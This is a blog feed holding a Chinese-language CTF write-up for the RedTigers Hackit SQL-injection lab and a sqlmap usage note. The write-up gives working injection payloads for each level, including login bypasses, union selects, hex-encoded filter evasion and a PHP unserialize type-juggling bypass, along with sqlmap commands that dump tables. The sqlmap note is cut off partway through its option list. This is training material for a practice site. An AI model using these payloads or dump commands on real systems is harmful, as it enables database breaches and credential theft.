<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ugly&#39;s Notes</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ug1y.github.io/"/>
  <updated>2016-10-05T13:00:48.830Z</updated>
  <id>http://ug1y.github.io/</id>
  
  <author>
    <name>ug1y</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RedTigers Hackit通关笔记</title>
    <link href="http://ug1y.github.io/2016/10/04/RedTigers-Hackit%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>http://ug1y.github.io/2016/10/04/RedTigers-Hackit通关笔记/</id>
    <published>2016-10-04T09:20:59.000Z</published>
    <updated>2016-10-05T13:00:48.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RedTigers Hackit是一个训练SQL注入漏洞和PHP方面的网站，地址为<a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="external">https://redtiger.labs.overthewire.org/</a>，也是看各位做CTF比赛的人分享的一个学习网站，总共有10关，感觉学到不少。</p>
<p><img src="/images/red_20161004172950.png" alt=""></p>
<a id="more"></a> 
<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>既然是简单的sql注入，那我们就按照正常流程去试试，试验知道cat参数是纯粹的数字输入，没有用引号包裹，构造<code>?cat=1 or 1</code>，能够正常输出。猜测select语句的列数<code>?cat=1 order by 4</code>得到输出4列，用联合查询得到产生输出的位置，最后构造查询语句从level1_users数据库中得到结果。注入语句构造如下：<br><strong><code>https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users</code></strong></p>
<p>ps：这里直接from数据库就可以，发现可以用<code>where 1</code>获得结果，然而<code>where username=&quot;Hornoxe&quot;</code>无法正确输出，猜测可能对引号禁用。</p>
<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>简单的登录绕过，立马想到应该是用万能密码，那么就找以下注入点，用户名和密码提示都不能为空，用户名和密码分别给一个<code>&#39;</code>符号，password参数报错，即为注入点，使用条件注入，<code>#</code>注释后面的语句构造如下：<br>Post data：<strong><code>username=a&amp;password=p&#39; or 1#&amp;login=Login</code></strong></p>
<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p>获取Admin用户的密码，提示我们产生一个错误，点击<code>TheCow</code>和<code>Admin</code>的链接，其<code>usr</code>参数得到<code>MDYzMjIzMDA2MTU2MTQxMjU0</code>和<code>MDQyMjExMDE0MTgyMTQw</code>，看样子像是编码过的，要让我们对请求参数产生一个错误，直接对参数输入引号等特殊字符应当会使得解码失败而无效，于是想到php传递一个数组过去看能不能产生错误，构造：<br><strong><code>https://redtiger.labs.overthewire.org/level3.php?usr[]=</code></strong></p>
<p>显示出来一个错误：<br><code>Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 25</code></p>
<p>根据路径去访问这个文件，可以得到文件的源码：（右击源代码查看）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	<span class="comment">// warning! ugly code ahead :)</span></div><div class="line">  		</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span></div><div class="line">	&#123;</div><div class="line">		$cryptedstr = <span class="string">""</span>;</div><div class="line">		srand(<span class="number">3284724</span>);</div><div class="line">		<span class="keyword">for</span> ($i =<span class="number">0</span>; $i &lt; strlen($str); $i++)</div><div class="line">		&#123;</div><div class="line">			$temp = ord(substr($str,$i,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">while</span>(strlen($temp)&lt;<span class="number">3</span>)</div><div class="line">			&#123;</div><div class="line">				$temp = <span class="string">"0"</span>.$temp;</div><div class="line">			&#125;</div><div class="line">			$cryptedstr .= $temp. <span class="string">""</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> base64_encode($cryptedstr);</div><div class="line">	&#125;</div><div class="line">  </div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> <span class="params">($str)</span></span></div><div class="line">	&#123;</div><div class="line">		srand(<span class="number">3284724</span>);</div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%'</span>,$str))</div><div class="line">		&#123;</div><div class="line">			$str = base64_decode($str);</div><div class="line">			<span class="keyword">if</span> ($str != <span class="string">""</span> &amp;&amp; $str != <span class="keyword">null</span> &amp;&amp; $str != <span class="keyword">false</span>)</div><div class="line">			&#123;</div><div class="line">				$decStr = <span class="string">""</span>;</div><div class="line">				</div><div class="line">				<span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($str); $i+=<span class="number">3</span>)</div><div class="line">				&#123;</div><div class="line">					$array[$i/<span class="number">3</span>] = substr($str,$i,<span class="number">3</span>);</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				<span class="keyword">foreach</span>($array <span class="keyword">as</span> $s)</div><div class="line">				&#123;</div><div class="line">					$a = $s ^ rand(<span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					$decStr .= chr($a);</div><div class="line">				&#125;</div><div class="line">				</div><div class="line">				<span class="keyword">return</span> $decStr;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>还是一样的方法，先构造注入语句，只是构造好之后编码再输入，几次尝试后，发现可以用<code>#</code>注释，构造<code>&#39; or 1#</code>可以成功注入，编码后<code>MDc2MTUxMDEyMTczMTk0MTg0MjIw</code>，于是下一步获取select语言的列数，构造<code>Admin&#39; order by 7#</code>，编码为<code>MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</code>，得知列数为7，最后通过联合查询，获取显示的列位并对应查构造语句如下：<br><strong><code>&#39; union select 1,username,3,4,5,password,7 from level3_users where username=&#39;Admin&#39;#</code></strong><br>编码为<strong><code>MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDIwMjM4MDE1MTI3MTMzMTkwMTU0MDAxMjQ2MTU3MjA4MTc3MDk2MTI4MjIwMTE2MTIxMTYzMTQ5MjEzMTYwMTA4MDMyMjUyMjAzMDk3MTU2MTkwMTc1MDEzMTM5MDc4MTU1MDk2MDg1MTM0MTk3MTE5MDU5MTYzMTc4MDU2MDM3MDAzMTM2MDQ3MDY2MTA2MTE0MDQ2MjA2MTQ4MDcyMTQxMjE0MDc1MDQ0MjE1MjAzMDM3MDgyMTk4MDcyMTIzMjE1MTE0MjIz</code></strong></p>
<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>这一关看样子是盲注了，页面输出<code>Query returned 1 rows.</code>消息来告知注入是否是正确返回查询的。首先判断注入点的注入方式，<code>?id=1 or 1</code>成功返回1行，即注入成功。<code>?id=1 order by 2</code>得到select语句总共输出两列。接下来的就是用<code>length()、substr()、ascii()</code>等函数对数据表的<code>keyword</code>列的内容进行猜测了。如下构造得知列内容长度为21：<br><strong><code>https://redtiger.labs.overthewire.org/level4.php?id=-1 or (select length(keyword) from level4_secret)&gt;20</code></strong></p>
<p>另外，对每一个字符进行猜测可得到所有字符，猜测到第一个字符ascii码为107，即字符<code>k</code>：<br><strong><code>https://redtiger.labs.overthewire.org/level4.php?id=-1 or (select ascii(substr(keyword,1,1)) from level4_secret)&gt;106</code></strong></p>
<p>可以写一个脚本来跑一遍得到最终结果，我比较懒，用sqlmap自动去跑好了，首先检测注入点：<br><strong><code>python sqlmap.py -u &quot;https://redtiger.labs.overthewire.org/level4.php?id=1&quot; --cookie &quot;level4login=there_is_no_bug&quot; --dbms mysql --batch</code></strong><br>接下来获取指定数据库中表的指定列内容，需要耐心等待：<br><strong><code>python sqlmap.py -u &quot;https://redtiger.labs.overthewire.org/level4.php?id=1&quot; --cookie &quot;level4login=there_is_no_bug&quot; --dbms mysql -D hackit -T level4_secret -C keyword --dump</code></strong></p>
<p><img src="/images/red_20161004190358.png" alt=""></p>
<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><p>题目提示是绕过登录，密码是MD5加密过的。表单username参数输入<code>\</code>输出错误，于是同样找到构造<code>a&#39; or 1#</code>来注入。首先获得select查询的列数<code>a&#39; order by 2#</code>得知列数为2，构造联合查询<code>a&#39; union select 1,2#</code>，其中两列一个是查询的username，另一个是md5加密过的password，查询语句获取相应的用户名和密码，然后查找是否有匹配的项，于是我们可以构造一对有效的组合，用户名为<code>1</code>，密码为<code>2</code>，于是密码的MD5值为<code>c81e728d9d4c2f636f067f89cc14862c</code>。</p>
<p>将密码的MD5值插到查询中，对应的值作为POST参数传递过去，匹配上则登录绕过成功，最终的构造为：<br>Post data：<strong><code>username=a&#39; union select 1,&#39;c81e728d9d4c2f636f067f89cc14862c&#39;#&amp;password=2&amp;login=Login</code></strong></p>
<h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><p>首先检测注入点是否需要引号括号之类闭包，得到<code>?user=1 or 1--+</code>可以注入。获取查询语句的列数<code>?user=1 order by 5--+</code>为5列，构造联合查询发现显示<code>User not found</code>，并没有显示对应的输出行，构造<code>?user=0 union select 1,2,3,4,5 from level6_users where status=1--+</code>也是一样，这里就比较郁闷了。</p>
<p>于是拿<code>username</code>放到<code>1,2,3,4,5</code>上各试了一下，发现<code>username</code>在<code>2</code>上的时候会正常显示。对应构造为<code>?user=0 union select 1,username,3,4,5 from level6_users--+</code>，那么就同样检测注入点<code>?user=0 union select 1,1&#39; or 1#,3,4,5 from level6_users--+</code>，这里出现了错误，在网上找的答案说是过滤，有可能就是过滤了单引号，那么就转成16进制试试<code>?user=0 union select 1,0x3127206f72203123,3,4,5 from level6_users--+</code>，成功显示了。</p>
<p>接下来就按照正常构造获取相应的显示位<code>1&#39; union select 1,2,3,4,5 from level6_users#</code>，转成16进制插入，对应的构造为<code>?user=0 union select 1,0x312720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f757365727323,3,4,5 from level6_users--+</code>，获取到显示位是2和4，查询用户名和密码，注意<code>status</code>状态为1，构造<strong><code>1&#39; union select 1,username,3,password,5 from level6_users where status=1#</code></strong>，转成16进制插入，最终的构造为：<br><strong><code>?user=0 union select 1,0x312720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5 from level6_users--+</code></strong></p>
<h1 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h1><p>要获取新闻相关的作者，首先输入<code>google</code>看看有哪些新闻，就一篇。试着产生错误比如加一个引号，报错得到了查询语句<code>SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#39;%google&#39;%&#39; OR text.title LIKE &#39;%google&#39;%&#39;)</code>，尝试检测注入点，<code>#</code>被禁止了不能用，那就试试<code>--</code>，貌似也被禁掉了，实际上空格可以使用如下符号替换其使用：<br><code>%20 %09 %0a %0b %0c %0d %a0 /**/</code></p>
<p>用<code>%a0</code>可以替换空格实现注释，其注入点为<code>search=google%&#39;)--%a0&amp;dosearch=search%21</code>，然后用同样的方法先猜测查询语句输出几列，发现<code>order</code>被禁不能用，那就直接联合查询猜测，发现共有4列。第4列和第3列显示出来了，最终的构造如下：<br>Post data：<strong><code>search=google%&#39;) union select 1,2,text.title,autor from level7_news news,level7_texts text where text.id=news.id--%a0&amp;dosearch=search%21</code></strong></p>
<h1 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h1><p>看样子应该是一个<code>update</code>语句，更新表单的操作。还是老办法，先找注入点，添加<code>\、&#39;、&quot;</code>等符号尝试每个请求参数，只有<code>Email</code>报出了错误如下<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;12345&#39;, age = &#39;25&#39; WHERE id = 1&#39; at line 3</code></p>
<p>根据页面上的错误，猜测是一个update语句，后台的SQL语句的写法应该是：<br><code>update table set name=[name], email=[email] ,icq=[icq], age=[age] where id=1</code><br>即检测得注入点<code>email=&#39; or &#39;&#39;=&#39;&amp;name=Hans&amp;icq=12345&amp;age=25&amp;edit=Edit</code>未报错成功返回印证了猜测。</p>
<p>这里的update语句中，<code>email</code>在<code>name</code>的后面，并且还作为注入点，可以用覆盖的方法来获取其他字段的内容，在大部分的语言中放在后面的字段赋值会覆盖掉原先有的变量值，这里覆盖后再把引号包起来构成完整的sql更新语句，最终构造如下，表单<code>name</code>控件将显示字段<code>password</code>的内容：<br>Post data：<strong><code>email=&#39;,name=password,icq=&#39;&amp;name=Hans&amp;icq=12345&amp;age=25&amp;edit=Edit</code></strong></p>
<h1 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h1><p>老办法挨个试一遍，发现表单请求<code>text</code>是注入点，页面报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;\&#39;)&#39; at line 6</code>，这里猜测后台使用<code>insert</code>语句插入然后查询，猜测其写法为：<br><code>insert into table(autor,title,text) values([autor],[title],[text])</code></p>
<p>利用<code>insert</code>语句插入多行结果，同时注意右边引号和括号的闭包，可以构造注入语句<code>autor=&amp;title=&amp;text=0&#39;),(1,2,&#39;3&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code>看到对应的显示位，其中第1位和第2位可以构造查询语句来获取我们想要的结果，最终构造注入为：<br>Post data：<strong><code>autor=&amp;title=&amp;text=0&#39;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#39;3&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></strong></p>
<h1 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h1><p>页面有一个隐藏的表单项<code>login</code>,点击登录后登录提示用户是Monkey，然后请求参数是一段类似乱码一样的东西，<code>login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&amp;dologin=Login</code>，不过看这些字符应该能猜到是base64编码了，所以果断解码一波得到<code>a:2:{s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;}</code></p>
<p>这么高端的数据表示方法没见过，后来搜了一下原来是php的序列化操作，函数<a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="external">serialize()</a>的输出，将对象序列化成字符串，便于网络传输，有点像json格式的数据，也就是说这种序列化对象的操作可以传递任意支持的数据类型。</p>
<p>由此可以猜测后台的php代码的写法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$new = unserialize($_POST[<span class="string">"login"</span>]);</div><div class="line">$username = $new[<span class="string">"username"</span>];</div><div class="line">$password = $new[<span class="string">"password"</span>];</div><div class="line">$sql = <span class="string">"select password from users where username="</span>.$username;</div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	$row = mysql_fetch_row($result);</div><div class="line">	<span class="keyword">if</span> ($row[<span class="string">"password"</span>]==$password) &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Welcome "</span>.$username;</div><div class="line">	&#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"login incorrect"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>假设是上面这种后台写法，那么就可以用php的若数据类型来绕过，序列化操作能够传递任意类型的数据，数据库中读取的密码是不为空的字符串，在<a href="http://php.net/manual/zh/types.comparisons.php#types.comparisions-loose" target="_blank" rel="external">松散比较</a>中，非空字符串与布尔真值、数字0相等，于是根据序列化的格式构造绕过<code>a:2:{s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;}</code>或者<code>a:2:{s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;i:0;}</code>都可以成功绕过，最终的构造如下：<br>Post data 1：<strong><code>login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=&amp;dologin=Login</code></strong><br>Post data 2：<strong><code>login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7aTowO30=&amp;dologin=Login</code></strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>果然高人们推荐的训练平台灰常的棒，前前后后查了不少资料也看了别人的writeup才学会弄明白。在这个平台慢慢掌握并学习到了SQL注入的一点点套路和方法，收获不少，同时也明白这信息安全背后有更多的内容需要学习。很多的知识并不像表面看上去那么复杂，实际上可能只是没有找到门路。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;RedTigers Hackit是一个训练SQL注入漏洞和PHP方面的网站，地址为&lt;a href=&quot;https://redtiger.labs.overthewire.org/&quot;&gt;https://redtiger.labs.overthewire.org/&lt;/a&gt;，也是看各位做CTF比赛的人分享的一个学习网站，总共有10关，感觉学到不少。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/red_20161004172950.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF Writeups" scheme="http://ug1y.github.io/categories/CTF-Writeups/"/>
    
    
      <category term="sql注入" scheme="http://ug1y.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用笔记</title>
    <link href="http://ug1y.github.io/2016/10/04/sqlmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://ug1y.github.io/2016/10/04/sqlmap使用笔记/</id>
    <published>2016-10-04T02:21:31.000Z</published>
    <updated>2016-10-04T09:21:47.735Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a>是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<blockquote>
<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>3、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
</blockquote>
<a id="more"></a>
<p>目前支持的数据库有MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
<h1 id="注入点检测"><a href="#注入点检测" class="headerlink" title="注入点检测"></a>注入点检测</h1><p>这是进行注入的第一步，找到能够注入的参数，即注入点。</p>
<p><strong>url请求注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot;</code><br><em>默认使用level1检测全部数据库类型</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot; --batch</code><br><em>使用默认配置运行，不询问用户的输入（比较常用）</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php?id=1&quot; --dbms mysql --level 3</code><br><em>指定数据库类型为mysql，级别为3（共5级，级别越高检测程度越深，级别大于3时会检测http请求头）</em></p>
<p><strong>post请求注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --data &quot;name=admin&amp;pass=1234&quot; -p &quot;name&quot;</code><br><em>输入data作为post请求的参数，-p指定username为注入点</em></p>
<p><strong>cookie注入：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --cookie &quot;id=11&quot; --level 2</code><br><em>当level到2以上时才会检测cookie，一般常用来作为会话的输入保持登录状态</em></p>
<h1 id="注入获取信息"><a href="#注入获取信息" class="headerlink" title="注入获取信息"></a>注入获取信息</h1><p>在上一步检测成功后，会显示成功的注入类型、名称和载荷并将这些成功的检测配置信息存入日志文件里，<strong>所以在这一步获取信息时，要带上检测时候输入的注入参数，在后面添加其他命令行参数执行。</strong></p>
<p><strong>获取数据库基本信息：</strong><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; --dbs</code><br><em>查询有哪些数据库</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test --tables</code><br><em>查询test数据库中有哪些表</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test -T user --columns</code><br><em>查询test数据库中user表有哪些字段</em><br><code>python sqlmap.py -u &quot;http://www.site.com/vuln.php&quot; -D test -T user --dump</code><br><em>导出test数据库中user表的所有内容</em></p>
<h1 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h1><p>（转自<a href="http://www.vuln.cn/1992" target="_blank" rel="external">http://www.vuln.cn/1992</a>）</p>
<ul>
<li>–is-dba 当前用户权限（是否为root权限）</li>
<li>–dbs 所有数据库</li>
<li>–current-db 网站当前数据库</li>
<li>–users 所有数据库用户</li>
<li>–current-user 当前数据库用户</li>
<li>–random-agent 构造随机user-agent</li>
<li>–passwords 数据库密码</li>
<li>–proxy <a href="http://local:8080" target="_blank" rel="external">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
</ul>
<p><strong>Options（选项）：</strong></p>
<ul>
<li>–version 显示程序的版本号并退出</li>
<li>-h, –-help 显示此帮助消息并退出</li>
<li>-hh 显示更高级的帮助消息并退出</li>
<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
</ul>
<p><strong>Target（目标）：</strong></p>
<p>以下至少需要设置其中一个选项，设置目标URL。</p>
<ul>
<li>-d DIRECT 直接连接到数据库。</li>
<li>-u URL, –url=URL 目标URL。</li>
<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
</ul>
<p><strong>Request（请求）：</strong></p>
<p>这些选项可以用来指定如何连接到目标URL。</p>
<ul>
<li>–data=DATA 通过POST发送的数据字符串</li>
<li>–cookie=COOKIE HTTP Cookie头</li>
<li>–cookie-urlencode URL 编码生成的cookie注入</li>
<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
<li>–user-agent=AGENT 指定 HTTP User – Agent头</li>
<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
<li>–referer=REFERER 指定 HTTP Referer头</li>
<li>–headers=HEADERS 换行分开，加入其他的HTTP头</li>
<li>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
<li>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</li>
<li>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）</li>
<li>–proxy=PROXY 使用HTTP代理连接到目标URL</li>
<li>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</li>
<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
<li>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
<li>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</li>
<li>–retries=RETRIES 连接超时后重新连接的时间（默认3）</li>
<li>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
<li>–safe-url=SAFURL 在测试过程中经常访问的url地址</li>
<li>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</li>
</ul>
<p><strong>Enumeration（枚举）：</strong></p>
<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p>
<ul>
<li>-b, –banner 检索数据库管理系统的标识</li>
<li>–current-user 检索数据库管理系统当前用户</li>
<li>–current-db 检索数据库管理系统当前数据库</li>
<li>–is-dba 检测DBMS当前用户是否DBA</li>
<li>–users 枚举数据库管理系统用户</li>
<li>–passwords 枚举数据库管理系统用户密码哈希</li>
<li>–privileges 枚举数据库管理系统用户的权限</li>
<li>–roles 枚举数据库管理系统用户的角色</li>
<li>–dbs 枚举数据库管理系统数据库</li>
<li>-D DBname 要进行枚举的指定数据库名</li>
<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
<li>–tables 枚举的DBMS数据库中的表</li>
<li>–columns 枚举DBMS数据库表列</li>
<li>–dump 转储数据库管理系统的数据库中的表项</li>
<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
<li>–search 搜索列（S），表（S）和/或数据库名称（S）</li>
<li>-C COL 要进行枚举的数据库列</li>
<li>-U USER 用来进行枚举的数据库用户</li>
<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
<li>–start=LIMITSTART 第一个查询输出进入检索</li>
<li>–stop=LIMITSTOP 最后查询的输出进入检索</li>
<li>–first=FIRSTCHAR 第一个查询输出字的字符检索</li>
<li>–last=LASTCHAR 最后查询的输出字字符检索</li>
<li>–sql-query=QUERY 要执行的SQL语句</li>
<li>–sql-shell 提示交互式SQL的shell</li>
</ul>
<p><strong>Optimization（优化）：</strong></p>
<p>这些选项可用于优化SqlMap的性能。</p>
<ul>
<li>-o 开启所有优化开关</li>
<li>–predict-output 预测常见的查询输出</li>
<li>–keep-alive 使用持久的HTTP（S）连接</li>
<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
<li>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
</ul>
<p><strong>Injection（注入）：</strong></p>
<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
<ul>
<li>-p TESTPARAMETER 可测试的参数（S）</li>
<li>–dbms=DBMS 强制后端的DBMS为此值</li>
<li>–os=OS 强制后端的DBMS操作系统为这个值</li>
<li>–prefix=PREFIX 注入payload字符串前缀</li>
<li>–suffix=SUFFIX 注入payload字符串后缀</li>
<li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li>
</ul>
<p><strong>Detection（检测）：</strong></p>
<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
<ul>
<li>–level=LEVEL 执行测试的等级（1-5，默认为1）</li>
<li>–risk=RISK 执行测试的风险（0-3，默认为1）</li>
<li>–string=STRING 查询时有效时在页面匹配字符串</li>
<li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li>
<li>–text-only 仅基于在文本内容比较网页</li>
</ul>
<p><strong>Techniques（技巧）：</strong></p>
<p>这些选项可用于调整具体的SQL注入测试。</p>
<ul>
<li>–technique=TECH SQL注入技术测试（默认BEUST）</li>
<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
<li>–union-cols=UCOLS 定列范围用于测试UNION查询注入</li>
<li>–union-char=UCHAR 用于暴力猜解列数的字符</li>
</ul>
<p><strong>Fingerprint（指纹）：</strong></p>
<ul>
<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
</ul>
<p><strong>Brute force（蛮力）：</strong></p>
<p>这些选项可以被用来运行蛮力检查。</p>
<ul>
<li>–common-tables 检查存在共同表</li>
<li>–common-columns 检查存在共同列</li>
</ul>
<p><strong>User-defined function injection（用户自定义函数注入）：</strong></p>
<p>这些选项可以用来创建用户自定义函数。</p>
<ul>
<li>–udf-inject 注入用户自定义函数</li>
